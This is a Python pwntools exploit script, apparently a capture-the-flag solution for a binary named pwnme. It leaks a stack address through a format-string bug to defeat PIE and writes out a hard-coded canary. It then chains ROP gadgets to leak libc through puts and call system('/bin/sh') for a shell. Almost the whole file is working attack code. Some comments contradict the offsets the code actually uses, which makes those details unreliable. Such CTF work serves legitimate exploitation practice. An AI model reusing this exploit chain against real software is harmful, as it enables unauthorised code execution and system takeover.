from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

# Binary filename
exe = './pwnme'

elf = context.binary = ELF(exe, checksec=False)

# Useful for seeing raw io data
context.log_level = 'debug'

# Exploit starts here
io = start()

# RIP offset is at 88 - found using gdb

# Format string vuln:
# Note: ASLR was turned off during the following steps.
# 12: b'0x555555557d78\n' looks constant

# We can use pwndbg to dump the pie base
# Pie base: Calculated VA from /home/will/CTF-Challenge-2/src/pwnme = 0x555555554000

# If we calculate the difference between our leaked address and our actual pie base
# We find an offset that will always point us to the pie base.
# 0x555555557d78 - 0x555555554000 = 0x3d78
# 12th element - 0x3d98 = PIEBASE

# Calculated custom canary hash for username %12$p\n
# This can be found by reverse engineering the secret() function
# d042ce2d80565354

# We want to leak an address from the stack using the format string vuln.
# As indicated above, #12 looks the most promising.
io.sendlineafter(b':\n', '%{}$p'.format(12), 16)
io.recvuntil(b'Welcome ')
leaked_addr = int(io.recvline(),16)
info("Leaked address: %#x", leaked_addr)

# Calculate PIE BASE
# The offset is constant even with ASLR enabled. 
# As long as we are using the same libc version
# This offset was calculated above
elf.address = leaked_addr - 0x3d98
info("Piebase: %#x", elf.address)

# Adjusted RIP offset 
# given that we need an extra 8 bytes for our fake canary at offset 72
# and then 8 bytes of padding.
rip_offset = 72

# Found using ropper or ROPgadgets
pop_rdi_offset = 0x12ee

# Calculate the true address of the gadget
pop_rdi = elf.address + pop_rdi_offset

# Leak libc address
payload = flat(
    {
    rip_offset: [
        p64(0xd042ce2d80565354), # Custom canary
        b'B'*8, # Padding
        pop_rdi, # RDI Gadget
        elf.got.puts, # Pop got puts into RDI
        elf.plt.puts, # Call puts() to leak got.puts
        elf.symbols.vuln # Return to our BOF for a second overflow
    ]
    }
)

io.sendlineafter(b'Enter your password:\n', payload)

# Grab the address of GOT PUTS
got_puts = unpack(io.recv()[:6].ljust(8, b'\x00'))
info("Leaked got_printf: %#x", got_puts)

# Calculate libc base addr from the puts addr
# # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
# # 235: 0000000000087bd0   550 FUNC    WEAK   DEFAULT   17 puts@@GLIBC_2.2.5
libc_base = got_puts - 0x87bd0
info("libc_base: %#x", libc_base)

# Calculate the system address
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
# 1050: 0000000000058750    45 FUNC    WEAK   DEFAULT   17 system@@GLIBC_2.2.5
system_addr = libc_base + 0x58740
info("system_addr: %#x", system_addr)

# Calculate /bin/sh from libc
# strings -a -t x //lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
# 1cb42f /bin/sh
bin_sh = libc_base + 0x1cb42f
info("bin_sh: %#x", bin_sh)

# Extra return gadget to align the stack.
ret = elf.address + 0x0101a

# Get a shell - system("/bin/sh")
payload = flat(
    {
    rip_offset: [
        p64(0xd042ce2d80565354), # Custom canary
        b'B'*8, # Padding
        ret, # Return gadget
        pop_rdi, # RDI gadget
        bin_sh, # pop /bin/sh in RDI
        system_addr, # Call system()
    ]
    }
)

io.sendline(payload)
io.interactive()